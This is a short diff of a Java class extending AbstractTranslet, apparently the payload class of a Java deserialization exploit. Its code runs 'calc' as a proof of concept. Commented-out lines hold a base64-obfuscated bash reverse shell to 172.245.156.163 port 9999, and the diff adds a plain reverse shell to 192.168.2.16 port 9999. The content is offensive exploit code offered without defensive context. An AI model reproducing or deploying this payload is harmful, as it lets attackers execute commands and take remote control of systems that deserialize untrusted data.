@@ -17,5 +17,6 @@ public class HelloTempImpl extends AbstractTranslet {
 //        Runtime.getRuntime().exec(new String[]{"cmd","/c","D:\\Genshin\" \"Impact\\Genshin\" \"Impact\" \"Game\\YuanShen.exe"});
 //        Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ1LjE1Ni4xNjMvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'");
         Runtime.getRuntime().exec("calc");
+//        bash -i >& /dev/tcp/192.168.2.16/9999 0>&1
     }
 }
